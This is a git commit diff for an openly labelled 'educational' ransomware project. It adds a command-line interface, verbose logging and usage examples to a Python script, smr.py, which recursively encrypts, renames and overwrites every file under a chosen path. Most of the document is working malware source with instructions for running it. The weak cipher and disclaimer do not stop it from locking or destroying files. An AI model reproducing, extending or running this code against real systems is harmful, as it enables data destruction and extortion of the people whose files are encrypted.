b4efdc68ef95287076503aeecf7e0ae5ffb7423b
StringManolo <manuelvarelacaldas@gmail.com>
2020-11-05 09:35:59 +0100

    Cli

--- README.md
+++ README.md
@@ -1,12 +1,35 @@
 # dangerous
-Dangerous Malware. Educational purpouse only.
+Dangerous Malware. Educational purpouse only.  
 
-Don't donwload to your PC if you don't know what are you doing.
+Don't donwload to your PC if you don't know what are you doing.  
+  
+Don't execute on other computers, systems, etc.  
+Just don't be dumb.  
+  
+I take no responsability for bad usage.  
+  
 
-Don't execute on other computers, systems, etc.
-Just don't be dumb.
+### Examples:
 
-I take no responsability for bad usage.
+Encrypt files in current folder:  
+```
+python smr.py -v -a txt -e -k 1337 -p ./
+```
+  
+Decrypt files in current folder:  
+```
+python smr.py -v -a txt -d -k 1337 -p ./
+```
+  
+### Arguments:  
+Usage: python smr.py [-option1] [-option2] [...]  
+ -a,  --adition  Add/Remove file extension to/from file.  
+ -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.  
+ -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernan or Affine encryption.  
+ -h,  --help     Open this menu.  
+ -i,  --interactive  Extra help to use the ransomware.  
+ -k,  --key      Key/Password to encrypt files.  
+ -p,  --path     Chose the path where the ransomware is goinf to run. All files in the path ans subpaths will be selected.  
+ -v,  --verbose  Add more output to the console. Show more information about the running tasks.  
 
-
-
+NOTICE: You can lose your files if the ranswomare crash, your pc shutdown or you can't remember your encryption key. I didn't made a bruteforce algorithm to decrypt the files. Since password is reused can be possible to recover the encrypted files. If you seriously need to, send me a message. https://twitter.com/XSStringManolo  
--- ransomware/smr.py
+++ ransomware/smr.py
@@ -1,6 +1,7 @@
 import os
 import sys
 import base64
+import time
 
 def getListOfFiles(dirName):
     listOfFile = os.listdir(dirName)
@@ -15,13 +16,14 @@ def getListOfFiles(dirName):
 
 def vernan(string, password, mode):
     if len(password) < len(string):
+        if verbose:
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Increasing password size to match open file size...")
         while len(password) < len(string):
             password = base64.b64encode(password.encode("ascii")).decode("ascii")
     i = 0
     aux = ""
     aux2 = []
-    strLen = len(string)
-
+    strLen = len(string) 
     while i < strLen:
         if mode == "b":
             passw = int(str(ord(password[i])))
@@ -41,22 +43,29 @@ def vernan(string, password, mode):
         aux2 = "".join(aux2)
         return bytearray.fromhex(aux2)
     else:
+        if verbose:
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of encrypted file: {len(aux)/1024} kilobytes")
         return aux[:-1]
 
 def ransom(passw, ext, path):
-    print("Starting to encrypt files...")
+    startingEncryptionTime = f"{str(int(round(time.time() * 1000)))[7:]}"
+    print(f"\n[{str(int(round(time.time() * 1000)))[6:]}] Starting to encrypt files...")
     files = getListOfFiles(path)
+    if verbose:                                                    print(f"[{str(int(round(time.time() * 1000)))[6:]}] List of files: {' '.join(files)}\n")
     thisFile = f"{path}{__file__}"
     i = 0;
     while i < len(files):
         if files[i] != thisFile:
-            print(f"Encrypting file {files[i]}...")
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Encrypting file {files[i]}...")
             f = open(files[i], "r+b")
             fContent = f.read()
+            if verbose:                                                    print(f"[{str(int(round(time.time() * 1000)))[6:]}] Size of file: {len(fContent)/1024}  kilobytes")
             fContent = fContent.hex()
             if os.path.splitext(files[i])[1]:
                 if os.path.splitext(files[i])[1] != f".{ext}":
                     os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
+                    if verbose:
+                        print(f"[{str(int(round(time.time() * 1000)))[6:]}] Rename {files[i][2:]} to {files[i][2:]}.{ext}")
 
             if not os.path.splitext(files[i])[1]:
                 if not os.path.exists(f"{files[i][2:]}.{ext}"):
@@ -68,14 +77,17 @@ def ransom(passw, ext, path):
                 f = open(f"{files[i]}.{ext}", "r+")
             f.seek(0)
             f.truncate()
+            if verbose:
+                print(f"[{str(int(round(time.time() * 1000)))[6:]}] Starting encryption...")
             f.write("".join(vernan(fContent, passw, "f")))
-            print(f"File \"{files[i]}\" encrypted.\n")
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" encrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingEncryptionTime)} milliseconds.\n")
             f.close()
         i += 1
 
 # I want to separate logic in functions to simplify understanding.
 def dransom(passw, ext, path):
-    print("Starting to decrypt files...")
+    startingDecryptionTime = f"{str(int(round(time.time() * 1000)))[7:]}"
+    print(f"\n[{str(int(round(time.time() * 1000)))[6:]}] Starting to decrypt files...")
     files = getListOfFiles(path)
     thisFile = f"{path}{__file__}"
 
@@ -86,7 +98,7 @@ def dransom(passw, ext, path):
                 if os.path.splitext(files[i])[1] == f".{ext}":
                     os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
                     files[i] = files[i][:-(len(ext)+1)]
-            print(f"Decrypting file {files[i]}...")
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] Decrypting file {files[i]}...")
             f = open(files[i], "r+")
             fContent = f.read()
             fContent = fContent.split("+")
@@ -102,7 +114,7 @@ def dransom(passw, ext, path):
             f.seek(0)
             f.truncate()
             f.write(vernan(fContent, passw, "b"))
-            print(f"File \"{files[i]}\" decrypted.\n")
+            print(f"[{str(int(round(time.time() * 1000)))[6:]}] File \"{files[i]}\" decrypted in {((int(str(int(round(time.time() * 1000)))[7:]))) - int(startingDecryptionTime)} milliseconds.\n")
             f.close()
         i += 1
 
@@ -112,11 +124,46 @@ def cli(recursion):
     path = "./"
     mode = "2"
 
+    helpMenu = f"""Usage: python smr.py [-option1] [-option2] [...]
+ -a,  --adition  Add/Remove file extension to/from file.
+ -d,  --decrypt  Only decrypt. If a non encrypted file is in the path, will be encrypted.
+ -e,  --encrypt  Only encrypt. Uses weak Symmetric-key algorithm. Similar to Vernan or Affine encryption.
+ -h,  --help     Open this menu.
+ -i,  --interactive  Extra help to use the ransomware.
+ -k,  --key      Key/Password to encrypt files. 
+ -p,  --path     Chose the path where the ransomware is goinf to run. All files in the path ans subpaths will be selected.
+ -v,  --verbose  Add more output to the console. Show more information about the running tasks.
+
+NOTICE: You can lose your files if the ranswomare crash, your pc shutdown or you can't remember your encryption key. I didn't made a bruteforce algorithm to decrypt the files. Since password is reused can be possible to recover the encrypted files. If you seriously need to, send me a message. https://twitter.com/XSStringManolo
+
+"""
+
     if len(sys.argv) > 1 or recursion == "interactive":
         i = 1
         if recursion == "interactive":
             i = 0
         while i < len(sys.argv):
+            if sys.argv[i] == '--verbose' or sys.argv[i] == '-v':
+                verbose = True
+
+            if sys.argv[i] == '-e' or sys.argv[i] == '--encrypt':
+                mode = 0
+
+            if sys.argv[i] == '-d' or sys.argv[i] == '--decrypt':
+                mode = 1
+                    
+            if sys.argv[i] == '-p' or sys.argv[i] == '--path':
+                path = sys.argv[i+1]
+                i += 1
+
+            if sys.argv[i] == '-k' or sys.argv[i] == '--key':
+                passw = sys.argv[i+1]
+                i += 1
+
+            if sys.argv[i] == '-a' or sys.argv[i] == '--adition':
+                ext = sys.argv[i+1]
+                i += 1
+
             if sys.argv[i] == '--interactive' or sys.argv[i] == '-i':
                 mode = input(f"""Ransomware Assistent:
 Write the number matching the option:
@@ -135,23 +182,31 @@ To encrypt current folder and subfolder from where you are running the ransomwar
                 passw = input(f"""Chose the password to encrypt the files. Can be any size. 
 Example: abc123
 € """)
+            elif sys.argv[i] == "--help" or sys.argv[i] == "-h":
+                print(helpMenu)
+                return 0
             elif i == 0:
                 "first argument. Don't to go else"
-            else:
-                print(f"""Help menu: """)
-                return 0
+#            else:
+#                print(f"""Help menu: """)
+#                return 0
             i += 1
-    if mode == "0":
+
+    if mode == "0" or mode == 0:
         ransom(passw, ext, path)
-    elif mode == "1":
+    elif mode == "1" or mode == 1:
         dransom(passw, ext, path)
-    elif mode == "2":
+    elif mode == "2" or mode == 2:
         ransom(passw, ext, path)
         dransom(passw, ext, path)
     else:
+        print(f"Chose a valid mode. {mode} not valid")
         cli("interactive")
 
+global verbose
+verbose = False
 if len(sys.argv) == 1:
     cli("interactive")
 else:
     cli("default")
+
